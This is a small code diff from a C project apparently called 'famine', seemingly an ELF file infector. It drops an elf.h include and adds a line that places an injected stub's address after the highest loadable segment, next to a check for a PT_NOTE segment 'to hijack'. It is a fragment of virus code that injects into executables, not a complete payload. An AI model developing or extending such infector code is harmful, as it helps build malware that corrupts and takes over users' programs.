@@ -1,5 +1,4 @@
 #include "../include/famine.h"
-#include <elf.h>
 
 int is_valid_elf(const Elf64_Ehdr *elf)
 {
@@ -52,6 +51,7 @@ int find_segments(t_famine *f)
 	}
 	if (!f->note)
 		return (LOG("no PT_NOTE segment to hijack\n"), 1);
+	f->stub_vaddr = highest_vaddr_end(f);
 	if (f->stub_vaddr == 0)
 		return (LOG("no PT_LOAD segment found\n"), 1);
 	return (0);
